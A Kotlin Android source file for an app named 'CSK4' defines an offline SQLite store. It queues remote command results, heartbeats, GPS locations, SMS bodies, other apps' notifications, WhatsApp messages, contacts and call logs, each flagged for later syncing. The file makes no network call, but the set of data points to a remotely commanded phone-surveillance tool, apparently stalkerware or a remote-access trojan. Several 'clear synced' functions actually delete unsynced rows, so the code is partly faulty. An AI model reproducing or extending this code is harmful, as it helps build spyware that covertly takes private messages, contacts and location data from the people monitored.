package com.csk4.app

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

class LocalStorage(context: Context) : SQLiteOpenHelper(context, DB_NAME, null, DB_VERSION) {

    companion object {
        private const val TAG = "CSK4_DB"
        private const val DB_NAME = "csk4_offline.db"
        private const val DB_VERSION = 1

        // Tables
        private const val TABLE_COMMANDS = "commands_queue"
        private const val TABLE_HEARTBEATS = "heartbeats_queue"
        private const val TABLE_LOCATIONS = "locations_queue"
        private const val TABLE_SMS = "sms_queue"
        private const val TABLE_NOTIFICATIONS = "notifications_queue"
        private const val TABLE_WHATSAPP = "whatsapp_queue"
        private const val TABLE_ACTIVITIES = "activities_queue"
        private const val TABLE_CONTACTS = "contacts_queue"
        private const val TABLE_CALLS = "calls_queue"
    }

    override fun onCreate(db: SQLiteDatabase) {
        // Commands queue
        db.execSQL("""
            CREATE TABLE $TABLE_COMMANDS (
                id TEXT PRIMARY KEY,
                result TEXT,
                synced INTEGER DEFAULT 0,
                timestamp INTEGER
            )
        """)

        // Heartbeats queue
        db.execSQL("""
            CREATE TABLE $TABLE_HEARTBEATS (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                battery INTEGER,
                synced INTEGER DEFAULT 0,
                timestamp INTEGER
            )
        """)

        // Locations queue
        db.execSQL("""
            CREATE TABLE $TABLE_LOCATIONS (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                lat REAL,
                lng REAL,
                synced INTEGER DEFAULT 0,
                timestamp INTEGER
            )
        """)

        // SMS queue
        db.execSQL("""
            CREATE TABLE $TABLE_SMS (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                from_number TEXT,
                body TEXT,
                time TEXT,
                type TEXT,
                synced INTEGER DEFAULT 0
            )
        """)

        // Notifications queue
        db.execSQL("""
            CREATE TABLE $TABLE_NOTIFICATIONS (
                id TEXT PRIMARY KEY,
                package_name TEXT,
                title TEXT,
                text TEXT,
                time INTEGER,
                synced INTEGER DEFAULT 0
            )
        """)

        // WhatsApp queue
        db.execSQL("""
            CREATE TABLE $TABLE_WHATSAPP (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                from_name TEXT,
                message TEXT,
                time INTEGER,
                synced INTEGER DEFAULT 0
            )
        """)

        // Activities queue
        db.execSQL("""
            CREATE TABLE $TABLE_ACTIVITIES (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                type TEXT,
                data TEXT,
                time INTEGER,
                synced INTEGER DEFAULT 0
            )
        """)

        // Contacts queue
        db.execSQL("""
            CREATE TABLE $TABLE_CONTACTS (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT,
                phone TEXT,
                type TEXT,
                synced INTEGER DEFAULT 0
            )
        """)

        // Calls queue
        db.execSQL("""
            CREATE TABLE $TABLE_CALLS (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                number TEXT,
                name TEXT,
                type INTEGER,
                duration INTEGER,
                time INTEGER,
                synced INTEGER DEFAULT 0
            )
        """)

        Log.d(TAG, "✅ Database created")
    }

    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        // Drop all tables and recreate
        db.execSQL("DROP TABLE IF EXISTS $TABLE_COMMANDS")
        db.execSQL("DROP TABLE IF EXISTS $TABLE_HEARTBEATS")
        db.execSQL("DROP TABLE IF EXISTS $TABLE_LOCATIONS")
        db.execSQL("DROP TABLE IF EXISTS $TABLE_SMS")
        db.execSQL("DROP TABLE IF EXISTS $TABLE_NOTIFICATIONS")
        db.execSQL("DROP TABLE IF EXISTS $TABLE_WHATSAPP")
        db.execSQL("DROP TABLE IF EXISTS $TABLE_ACTIVITIES")
        db.execSQL("DROP TABLE IF EXISTS $TABLE_CONTACTS")
        db.execSQL("DROP TABLE IF EXISTS $TABLE_CALLS")
        onCreate(db)
    }

    // ============ COMMANDS ============
    fun addCommandResult(id: String, result: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("id", id)
                put("result", result)
                put("synced", 0)
                put("timestamp", System.currentTimeMillis())
            }
            db.insertWithOnConflict(TABLE_COMMANDS, null, cv, SQLiteDatabase.CONFLICT_REPLACE)
        } catch (e: Exception) { Log.e(TAG, "addCmd: ${e.message}") }
    }

    fun getPendingCommandResults(): List<Pair<String, String>> {
        val list = mutableListOf<Pair<String, String>>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery("SELECT id, result FROM $TABLE_COMMANDS WHERE synced=0 LIMIT 100", null)
            cur.use {
                while (it.moveToNext()) {
                    list.add(Pair(it.getString(0), it.getString(1) ?: ""))
                }
            }
        } catch (e: Exception) {}
        return list
    }

    fun markCommandSynced(id: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply { put("synced", 1) }
            db.update(TABLE_COMMANDS, cv, "id=?", arrayOf(id))
            // Delete synced older than 1 day
            db.delete(TABLE_COMMANDS, "synced=1 AND timestamp < ?",
                arrayOf((System.currentTimeMillis() - 86400000).toString()))
        } catch (e: Exception) {}
    }

    // ============ HEARTBEATS ============
    fun addHeartbeat(battery: Int) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("battery", battery)
                put("synced", 0)
                put("timestamp", System.currentTimeMillis())
            }
            db.insert(TABLE_HEARTBEATS, null, cv)
        } catch (e: Exception) {}
    }

    fun getPendingHeartbeats(): List<Int> {
        val list = mutableListOf<Int>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery("SELECT id, battery FROM $TABLE_HEARTBEATS WHERE synced=0 LIMIT 50", null)
            cur.use {
                while (it.moveToNext()) {
                    list.add(it.getInt(1))
                }
            }
        } catch (e: Exception) {}
        return list
    }

    fun markHeartbeatSynced(battery: Int) {
        try {
            val db = writableDatabase
            db.delete(TABLE_HEARTBEATS, "battery=? AND synced=0", arrayOf(battery.toString()))
        } catch (e: Exception) {}
    }

    // ============ LOCATIONS ============
    fun addLocation(lat: Double, lng: Double) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("lat", lat)
                put("lng", lng)
                put("synced", 0)
                put("timestamp", System.currentTimeMillis())
            }
            db.insert(TABLE_LOCATIONS, null, cv)
        } catch (e: Exception) {}
    }

    fun getPendingLocations(): List<Pair<Double, Double>> {
        val list = mutableListOf<Pair<Double, Double>>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery("SELECT lat, lng FROM $TABLE_LOCATIONS WHERE synced=0 LIMIT 100", null)
            cur.use {
                while (it.moveToNext()) {
                    list.add(Pair(it.getDouble(0), it.getDouble(1)))
                }
            }
        } catch (e: Exception) {}
        return list
    }

    fun markLocationSynced(lat: Double, lng: Double) {
        try {
            val db = writableDatabase
            db.delete(TABLE_LOCATIONS, "lat=? AND lng=? AND synced=0",
                arrayOf(lat.toString(), lng.toString()))
        } catch (e: Exception) {}
    }

    // ============ SMS ============
    fun addSMS(from: String, body: String, time: String, type: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("from_number", from)
                put("body", body)
                put("time", time)
                put("type", type)
                put("synced", 0)
            }
            db.insert(TABLE_SMS, null, cv)
        } catch (e: Exception) {}
    }

    fun getPendingSMS(): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery("SELECT from_number, body, time, type FROM $TABLE_SMS WHERE synced=0 LIMIT 200", null)
            cur.use {
                while (it.moveToNext()) {
                    list.add(JSONObject().apply {
                        put("from", it.getString(0))
                        put("body", it.getString(1))
                        put("time", it.getString(2))
                        put("type", it.getString(3))
                    })
                }
            }
        } catch (e: Exception) {}
        return list
    }

    fun clearSyncedSMS() {
        try {
            writableDatabase.delete(TABLE_SMS, "synced=0", null)
        } catch (e: Exception) {}
    }

    // ============ NOTIFICATIONS ============
    fun addNotification(pkg: String, title: String, text: String) {
        try {
            val id = System.currentTimeMillis().toString() + "_" + pkg.hashCode()
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("id", id)
                put("package_name", pkg)
                put("title", title)
                put("text", text)
                put("time", System.currentTimeMillis())
                put("synced", 0)
            }
            db.insertWithOnConflict(TABLE_NOTIFICATIONS, null, cv, SQLiteDatabase.CONFLICT_REPLACE)
        } catch (e: Exception) {}
    }

    fun getPendingNotifications(): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery("SELECT id, package_name, title, text FROM $TABLE_NOTIFICATIONS WHERE synced=0 LIMIT 100", null)
            cur.use {
                while (it.moveToNext()) {
                    list.add(JSONObject().apply {
                        put("id", it.getString(0))
                        put("package", it.getString(1))
                        put("title", it.getString(2))
                        put("text", it.getString(3))
                    })
                }
            }
        } catch (e: Exception) {}
        return list
    }

    fun markNotificationSynced(id: String) {
        try {
            writableDatabase.delete(TABLE_NOTIFICATIONS, "id=?", arrayOf(id))
        } catch (e: Exception) {}
    }

    // ============ WHATSAPP ============
    fun addWhatsApp(from: String, message: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("from_name", from)
                put("message", message)
                put("time", System.currentTimeMillis())
                put("synced", 0)
            }
            db.insert(TABLE_WHATSAPP, null, cv)
        } catch (e: Exception) {}
    }

    fun getPendingWhatsApp(): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery("SELECT from_name, message, time FROM $TABLE_WHATSAPP WHERE synced=0 LIMIT 100", null)
            cur.use {
                while (it.moveToNext()) {
                    list.add(JSONObject().apply {
                        put("from", it.getString(0))
                        put("message", it.getString(1))
                        put("time", it.getLong(2))
                    })
                }
            }
        } catch (e: Exception) {}
        return list
    }

    fun clearSyncedWhatsApp() {
        try {
            writableDatabase.delete(TABLE_WHATSAPP, "synced=0", null)
        } catch (e: Exception) {}
    }

    // ============ ACTIVITIES ============
    fun addActivity(type: String, data: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("type", type)
                put("data", data)
                put("time", System.currentTimeMillis())
                put("synced", 0)
            }
            db.insert(TABLE_ACTIVITIES, null, cv)
        } catch (e: Exception) {}
    }

    fun getPendingActivities(): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery("SELECT type, data, time FROM $TABLE_ACTIVITIES WHERE synced=0 LIMIT 100", null)
            cur.use {
                while (it.moveToNext()) {
                    list.add(JSONObject().apply {
                        put("type", it.getString(0))
                        put("data", it.getString(1))
                        put("time", it.getLong(2))
                    })
                }
            }
        } catch (e: Exception) {}
        return list
    }

    fun clearSyncedActivities() {
        try {
            writableDatabase.delete(TABLE_ACTIVITIES, "synced=0", null)
        } catch (e: Exception) {}
    }

    // ============ CONTACTS (NEW) ============
    fun addContact(name: String, phone: String, type: String) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("name", name)
                put("phone", phone)
                put("type", type)
                put("synced", 0)
            }
            db.insert(TABLE_CONTACTS, null, cv)
        } catch (e: Exception) {}
    }

    fun getPendingContacts(): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        try {
            val db = readableDatabase
            val cur = db.rawQuery("SELECT name, phone, type FROM $TABLE_CONTACTS WHERE synced=0 LIMIT 200", null)
            cur.use {
                while (it.moveToNext()) {
                    list.add(JSONObject().apply {
                        put("name", it.getString(0))
                        put("phone", it.getString(1))
                        put("type", it.getString(2))
                    })
                }
            }
        } catch (e: Exception) {}
        return list
    }

    // ============ CALLS (NEW) ============
    fun addCall(number: String, name: String, type: Int, duration: Long, time: Long) {
        try {
            val db = writableDatabase
            val cv = ContentValues().apply {
                put("number", number)
                put("name", name)
                put("type", type)
                put("duration", duration)
                put("time", time)
                put("synced", 0)
            }
            db.insert(TABLE_CALLS, null, cv)
        } catch (e: Exception) {}
    }

    // ============ CLEANUP ============
    fun cleanup() {
        try {
            val db = writableDatabase
            val weekAgo = System.currentTimeMillis() - 7 * 86400000
            db.delete(TABLE_COMMANDS, "synced=1 AND timestamp < ?", arrayOf(weekAgo.toString()))
            db.delete(TABLE_HEARTBEATS, "synced=1", null)
            db.delete(TABLE_LOCATIONS, "synced=1", null)
            Log.d(TAG, "Cleanup done")
        } catch (e: Exception) {}
    }

    fun getPendingCount(): Int {
        var count = 0
        try {
            val db = readableDatabase
            listOf(TABLE_COMMANDS, TABLE_HEARTBEATS, TABLE_LOCATIONS, TABLE_SMS,
                   TABLE_NOTIFICATIONS, TABLE_WHATSAPP, TABLE_ACTIVITIES).forEach { table ->
                val cur = db.rawQuery("SELECT COUNT(*) FROM $table WHERE synced=0", null)
                cur.use { if (it.moveToFirst()) count += it.getInt(0) }
            }
        } catch (e: Exception) {}
        return count
    }
}
